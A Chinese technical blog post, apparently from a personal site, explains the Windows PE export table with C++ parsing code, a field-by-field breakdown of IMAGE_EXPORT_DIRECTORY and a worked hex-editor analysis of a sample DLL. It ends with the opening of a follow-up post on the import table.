class="comment">//确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS* nt;</span><br><span class="line">        <span class="comment">//让PE文件头指针指向其对应的地址</span></span><br><span class="line">        nt = (_IMAGE_NT_HEADERS*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**) <span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span>(cnt&lt; nt-&gt;FileHeader.NumberOfSections)&#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER)*cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x18FB0</span>,dos,(_IMAGE_NT_HEADERS*)nt,sectionArr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR64_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;64位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS64* nt;</span><br><span class="line">        nt = (_IMAGE_NT_HEADERS64*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>关键代码</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x18FB0</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p>由于之前的函数是VA转FOA，这边我们拿到的是RVA,因此想要正确利用，需要用到RVA + ImageBase得到VA</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014201121563.png" alt="image-20211014201121563"></p>
<p>自此拿到FOA为:0x79B0</p>
<h2 id="导出表的结构"><a href="#导出表的结构" class="headerlink" title="导出表的结构"></a>导出表的结构</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>可以定位到导出表后下一步便是要了解导出表的结构，才能解读导出表的信息</p>
<p>C语言中的结构体(Winnt.h可以找到)，本结构在C语言中长40字节，导出表范围:导出表首地址(FOA)+导出表长度-1 (减1是由于导出表首地址也占一个字节)</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014203245039.png" alt="image-20211014203245039"></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>结构体分析</strong></p>
<table>
<thead>
<tr>
<th>成员</th>
<th>数据宽度</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Characteristics</td>
<td>DWORD(4字节)</td>
<td>标志，未用</td>
</tr>
<tr>
<td>TimeDateStamp</td>
<td>DWORD(4字节)</td>
<td>时间戳</td>
</tr>
<tr>
<td>MajorVersion</td>
<td>WORD(2字节)</td>
<td>未用</td>
</tr>
<tr>
<td>MinorVersion</td>
<td>WORD(2字节)</td>
<td>未用</td>
</tr>
<tr>
<td>Name</td>
<td>DWORD(4字节)</td>
<td>指向该导出表的文件名字符串</td>
</tr>
<tr>
<td>Base</td>
<td>DWORD(4字节)</td>
<td>导出函数起始序号</td>
</tr>
<tr>
<td>NumberOfFunctions</td>
<td>DWORD(4字节)</td>
<td>所有导出函数的个数</td>
</tr>
<tr>
<td>NumberOfNames</td>
<td>DWORD(4字节)</td>
<td>以函数名字导出的函数个数</td>
</tr>
<tr>
<td>AddressOfFunctions</td>
<td>DWORD(4字节)</td>
<td>导出函数地址表RVA</td>
</tr>
<tr>
<td>AddressOfNames</td>
<td>DWORD(4字节)</td>
<td>导出函数名称表RVA</td>
</tr>
<tr>
<td>AddressOfNameOrdinals</td>
<td>DWORD(4字节)</td>
<td>导出函数序号表RVA</td>
</tr>
</tbody></table>
<p>解释几个比较重要的字段</p>
<h4 id="Name"><a href="#Name" class="headerlink" title="Name"></a>Name</h4><p>该字段指示的地址指向了一个以”\0”结尾的字符串，字符串记录了导出表所在文件的最初文件名，因此就算后期重命名此PE文件，也可在name处找到最初文件名</p>
<h4 id="Base："><a href="#Base：" class="headerlink" title="Base："></a>Base：</h4><p>该字段指出了导出函数序号的起始值。dll中第一个导出函数的序号并非从0开始，导出函数的编号等于从AddressOfFunction开始的序号加上这个值。大概意思是这样</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014205036689.png" alt="image-20211014205036689"></p>
<p>如图所示，Func1的函数编号为nBase + 0 = 200h， Func2的函数编号为 nbase + 1 = 201h</p>
<h4 id="NumberOfFunctions"><a href="#NumberOfFunctions" class="headerlink" title="NumberOfFunctions"></a>NumberOfFunctions</h4><p>该字段定义了文件中导出函数的总个数</p>
<h4 id="NumberOfNames"><a href="#NumberOfNames" class="headerlink" title="NumberOfNames"></a>NumberOfNames</h4><p>在导出表中，有些函数是定义名字的，有些是没有定义名字的。该字段记录了所有定义名字函数的个数。如果这个值是0，则表示所有的函数都没有定义名字。NumbersOfNames一定小于等于NumbersOfFuctions</p>
<h4 id="AddressOfNames"><a href="#AddressOfNames" class="headerlink" title="AddressOfNames"></a>AddressOfNames</h4><p>该值为一个指针。该指针指向的位置是一连串的DWORD值，这些值均指向了对应的定义了函数名的函数的字符串地址。这一连串的DWORD值的个数为NumberOfNames</p>
<h4 id="AddressOfFunctions"><a href="#AddressOfFunctions" class="headerlink" title="AddressOfFunctions"></a>AddressOfFunctions</h4><p>该指针指向了全部导出函数的入口地址的起始。从入口地址开始为DWORD数组，数组的个数由NumbersOfFuctions决定</p>
<p>导出函数的每一个地址<strong>按函数的编号顺序</strong>依次往后排开。在内存中，可以通过<strong>函数编号</strong>来定位某个函数的地址</p>
<h4 id="AddressOfNameOrdinals"><a href="#AddressOfNameOrdinals" class="headerlink" title="AddressOfNameOrdinals"></a>AddressOfNameOrdinals</h4><p>该值也是一个指针，与AddressOfNames是<strong>一一对应</strong>关系</p>
<p>不同的是，AddressOfNames指向的是字符串的指针数组，而AddressOfNameOrdinals则指向了该函数在AddressOfFunctions中的<strong>索引值</strong></p>
<hr>
<p>注意：<strong>索引值数据类型为WORD，而非DWORD</strong>。该值与函数编号是两个不同的概念，两者的关系为：</p>
<p>索引值 = 编号 - Base</p>
<h3 id="根据结构分析导出表"><a href="#根据结构分析导出表" class="headerlink" title="根据结构分析导出表"></a>根据结构分析导出表</h3><p>根据之前拿到的导出表FOA + 40 - 1 ，拿到导出表范围，自0x79B0 至0x79D7</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015093614192.png" alt="image-20211015093614192"></p>
<table>
<thead>
<tr>
<th align="center">成员</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Characteristics</td>
<td>0x00000000</td>
<td>标志，未用</td>
</tr>
<tr>
<td align="center">TimeDateStamp</td>
<td>0xFFFFFFFF</td>
<td>时间戳</td>
</tr>
<tr>
<td align="center">MajorVersion</td>
<td>0x0000</td>
<td>未用</td>
</tr>
<tr>
<td align="center">MinorVersion</td>
<td>0x0000</td>
<td>未用</td>
</tr>
<tr>
<td align="center">Name</td>
<td>0x0001900A</td>
<td>指向该导出表文件名字符串</td>
</tr>
<tr>
<td align="center">Base</td>
<td>0x0000000A</td>
<td>导出函数的起始序号</td>
</tr>
<tr>
<td align="center">NumberOfFunctions</td>
<td>0x00000008</td>
<td>所有导出函数的个数</td>
</tr>
<tr>
<td align="center">NumberOfNames</td>
<td>0x00000003</td>
<td>以函数名字导出的函数个数</td>
</tr>
<tr>
<td align="center">AddressOfFunctions</td>
<td>0x00018FD8</td>
<td>导出函数地址表RVA</td>
</tr>
<tr>
<td align="center">AddressOfNames</td>
<td>0x00018FF8</td>
<td>导出函数名称表RVA</td>
</tr>
<tr>
<td align="center">AddressOfNameOrdinals</td>
<td>0x00019004</td>
<td>导出函数序号表RVA</td>
</tr>
</tbody></table>
<h4 id="Name-1"><a href="#Name-1" class="headerlink" title="Name"></a>Name</h4><p>存储的值为指针，该指针为RVA(0x1900A)，同样需要转换成FOA</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x1900A</span>,dos,nt,sectionArr); <span class="comment">//0x1900A 为name的rva</span></span><br></pre></td></tr></table></figure>

<p>运行可得</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015110233872.png" alt="image-20211015110233872"></p>
<p>利用16进制编辑器得到0x7A0A,拿到Name,PE文件的文件名字符串，以00结尾，MyDll.dll</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015110551475.png" alt="image-20211015110551475"></p>
<h4 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h4><p>导出函数起始序号的RVA 为 0xA , 对应十进制10</p>
<p>回顾之前导出函数的定义</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">Add @<span class="number">12</span> </span><br><span class="line">Sub @<span class="number">15</span> NONAME</span><br><span class="line">Multiply @<span class="number">17</span></span><br><span class="line">Divide @<span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>可以看出，此处的base=最小的序号=min{12,15,17,10}=10</p>
<h4 id="NumberOfFunctions-1"><a href="#NumberOfFunctions-1" class="headerlink" title="NumberOfFunctions"></a>NumberOfFunctions</h4><p>所有导出函数的个数为8</p>
<p>为什么前面声明的导出函数只有4个，但这里显示的却会有八个？</p>
<p>此处的NumberOfFunctions = 最大的序号减去最小的序号 +1 =17-10+1=8</p>
<h4 id="NumberOfNames-1"><a href="#NumberOfNames-1" class="headerlink" title="NumberOfNames"></a>NumberOfNames</h4><p>以函数名字导出的函数个数为3，和定义声明中有名称的导出函数数量一致</p>
<h4 id="AddressOfFunctions-1"><a href="#AddressOfFunctions-1" class="headerlink" title="AddressOfFunctions"></a>AddressOfFunctions</h4><p>存储的值为指针，该指针为RVA(0x18FD8)，同样需要转换为FOA</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x18FD8</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p>利用之前的VA转FOA程序修改VaToFoa32代码处数值</p>
<p>运行程序可得AddressOfFunctions处文件偏移为0x79D8,跳转到该地址</p>
<p>根据AddressOfFunctions （DWORD）为数组且数组个数由NumbersOfFuctions决定，本dll文件NumberOfFunctions为8</p>
<p>因此8x4=32（10进制字节数）</p>
<p><strong>拿到每个函数的RVA</strong>.</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015112733536.png" alt="image-20211015112733536"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015113610137.png" alt="image-20211015113610137"></p>
<p>记录下每个导出函数的地址并转换为RVA为FOA得到</p>
<table>
<thead>
<tr>
<th>Oridinals（索引）</th>
<th>序号(Base+ORIDINALS)</th>
<th>导出函数地址(RVA)</th>
<th>导出函数地址(FOA)</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>10+0 = 10</td>
<td>0x00011320</td>
<td>0x720</td>
</tr>
<tr>
<td>1</td>
<td>10+1=11</td>
<td>0x00000000</td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>12</td>
<td>0x00011302</td>
<td>0x702</td>
</tr>
<tr>
<td>3</td>
<td>13</td>
<td>0x00000000</td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>14</td>
<td>0x00000000</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>15</td>
<td>0x000111EF</td>
<td>0x5EF</td>
</tr>
<tr>
<td>6</td>
<td>16</td>
<td>0x00000000</td>
<td></td>
</tr>
<tr>
<td>7</td>
<td>17</td>
<td>0x000111A4</td>
<td>0x5A4</td>
</tr>
</tbody></table>
<p>可以发现，只有4个函数存在有效地址，跟前方Mydll.dll定义的序号以及数量一致</p>
<h4 id="AddressOfNames-1"><a href="#AddressOfNames-1" class="headerlink" title="AddressOfNames"></a>AddressOfNames</h4><p>内部存储着导出函数名称表的RVA</p>
<p>存储的值为指针，该指针为RVA，同样需要转为FOA</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x18FF8</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015115246528.png" alt="image-20211015115246528"></p>
<p>16进制编辑器直接跳转过去</p>
<p>导出函数名称表 = 导出函数名称表单个大小(DWORD) * NumberOfNames值 = 4 * 3 = 12（十进制）</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015120351876.png" alt="image-20211015120351876"></p>
<p>拿到所有导出函数名称的地址</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00019014</span></span><br><span class="line"><span class="number">0x00019018</span></span><br><span class="line"><span class="number">0x0001901F</span></span><br></pre></td></tr></table></figure>

<p>利用程序将RVA转为OA</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x19014</span>,dos,nt,sectionArr);</span><br><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x19018</span>,dos,nt,sectionArr);</span><br><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x1901F</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p>按照顺序依次拿到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foa 7a14</span><br><span class="line">foa 7a18</span><br><span class="line">foa 7a1f</span><br></pre></td></tr></table></figure>

<p>即得到有名称函数的名称地址为：</p>
<table>
<thead>
<tr>
<th>顺序索引</th>
<th>RVA</th>
<th>FOA</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>0x19014</td>
<td>0x7A14</td>
</tr>
<tr>
<td>2</td>
<td>0x19018</td>
<td>0x7A18</td>
</tr>
<tr>
<td>3</td>
<td>0x1901F</td>
<td>0x7A1F</td>
</tr>
</tbody></table>
<p>利用FOA与16进制编辑器拿到各自的函数名字符串</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015120841885.png" alt="image-20211015120841885"></p>
<table>
<thead>
<tr>
<th>顺序索引</th>
<th>RVA</th>
<th>FOA</th>
<th>导出函数名称</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>0x19014</td>
<td>0x7A14</td>
<td>Add</td>
</tr>
<tr>
<td>2</td>
<td>0x19018</td>
<td>0x7A18</td>
<td>Divide</td>
</tr>
<tr>
<td>3</td>
<td>0x1901F</td>
<td>0x7A1F</td>
<td>Multiply</td>
</tr>
</tbody></table>
<h4 id="AddressOfNameOrdinals-1"><a href="#AddressOfNameOrdinals-1" class="headerlink" title="AddressOfNameOrdinals"></a>AddressOfNameOrdinals</h4><p>存储的值为指针，指针为RVA，同样需要转为FOA在PE文件中读取</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x19004</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p>获取foa为 7A04</p>
<p>跳转至0x7A04位置</p>
<p>由NumberOfFunctions可知共有3个有名函数</p>
<p>因此Ordinals列表为 4x3=12</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015121856554.png" alt="image-20211015121856554"></p>
<p>拿到有名称的Ordinals</p>
<p>Ordinals的为Word型，共2个字节</p>
<table>
<thead>
<tr>
<th>顺序索引</th>
<th>Oridinals</th>
<th>序号(Oridinals+Base)</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>0x0002</td>
<td>12</td>
</tr>
<tr>
<td>2</td>
<td>0x0000</td>
<td>10</td>
</tr>
<tr>
<td>3</td>
<td>0x0007</td>
<td>17</td>
</tr>
</tbody></table>
<p>根据有名称函数的Oridinals结合前面得到的AddressOfFunctions和AdressOfNames，就可以得到函数的名称、函数的地址的关系</p>
<table>
<thead>
<tr>
<th>顺序索引</th>
<th>Oridinals</th>
<th>导出函数地址(RVA)</th>
<th>导出函数地址(FOA)</th>
<th>函数名称</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>0x0002</td>
<td>0x00011302</td>
<td>0x702</td>
<td>Add</td>
</tr>
<tr>
<td>2</td>
<td>0x0000</td>
<td>0x00011320</td>
<td>0x720</td>
<td>Divide</td>
</tr>
<tr>
<td>3</td>
<td>0x0007</td>
<td>0x000111A4</td>
<td>0x5A4</td>
<td>Multiply</td>
</tr>
</tbody></table>
<p>至此导出表分析完毕</p>
<h3 id="由导出表获得导出函数"><a href="#由导出表获得导出函数" class="headerlink" title="由导出表获得导出函数"></a>由导出表获得导出函数</h3><p>从前面的分析中可以得知查询导出表有两个办法</p>
<ul>
<li>根据导出表函数名称获得导出函数地址</li>
<li>根据导出表函数序号获得导出函数地址</li>
</ul>
<h4 id="函数名称获取导出函数地址"><a href="#函数名称获取导出函数地址" class="headerlink" title="函数名称获取导出函数地址"></a>函数名称获取导出函数地址</h4><ol>
<li>根据导出表的函数名称去AddressOfNames指向的每个名称字符串查询是否有匹配的字符串</li>
<li>找到匹配的字符串后，根据找到的顺序索引去AddressOfNameOrdinals中找到对应的Ordinals</li>
<li>根据前面找到的Ordinals到AddressOfFunctions中获得函数地址</li>
</ol>
<p>图示</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015125252798.png" alt="image-20211015125252798"></p>
<h4 id="函数序号取得导出函数"><a href="#函数序号取得导出函数" class="headerlink" title="函数序号取得导出函数"></a>函数序号取得导出函数</h4><ol>
<li>根据函数序号-导出表.Base获得导出函数的Ordinal</li>
<li>根据前面拿到的Ordinals到AddressOfFunctions中获得函数地址</li>
</ol>
<p>图示</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015125443438.png" alt="image-20211015125443438"></p>
<p>也可利用工具得出导出表的RVA,后利用RVA转FOA可获得其文件偏移量</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015125801883.png" alt="image-20211015125801883"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015130012615.png" alt="image-20211015130012615"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>导出表中还包含了三张小表:导出函数地址表、导出函数名称表</li>
<li>导出表中存储了指向这三张表的指针，而不是直接存储表内的内容</li>
<li>无论是根据函数名称还是函数序号来获取导出函数，都需要用到Ordinals,用Ordinals到导出函数地址表中获取地址</li>
<li>导出表的Base取决于编写DLL时导出定义的最小序号</li>
<li>导出表的NumberOfFuctions取决于编写DLL时导出定义的序号最大差值+1</li>
<li>导出名称表和导出函数序号表只对有名称的导出函数有效</li>
</ul>
<p>学习复现自52pojie论坛内的lyl640abc 师傅的pe笔记系列</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PE%E7%BB%93%E6%9E%84/" rel="tag">PE结构</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-PE结构-导入表(2)" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/13/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2)/" class="article-date">
      <time datetime="2021-10-13T06:45:18.000Z" itemprop="datePublished">2021-10-13</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/13/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2)/">PE结构-导入表（2）</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>首先，PE文件中的数据被载入内存后根据不同页面属性被划分成很多区块(节)，并有区块表（节表）的数据来描述这些区块，这里我们需要注意一点：<strong>一个区块中的数据仅仅知识由于属性相同而放一起，并不一定是同一种用途的内容。例如输入表、输出表等就有可能和只读常量一起被放在同一个区块中。因为他们的属性都是可读不可写的。</strong></p>
<p>其次，由于不同用途的数据有可能被放入同一个区块中，因此仅仅依靠区块表是无法确定和定位的。因此还需要通过PE文件头中的IMAGE_OPTIONAL_READER32结构的数据目录表来指出他们的位置，我们可以由数据目录表来定位他们的位置，我们可以由数据目录表来定位的数据包括输入表、输出表、资源、重定位表和TLS等15种数据。</p>
<h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><h4 id="导入表的作用"><a href="#导入表的作用" class="headerlink" title="导入表的作用"></a>导入表的作用</h4><p>当程序运行时，需要多个PE文件共同组成</p>
<p>PE文件提供哪些功能给其他PE文件是导出表的作用</p>
<p>PE文件需要依赖的模块以及依赖模块中的哪些函数是导出表的作用</p>
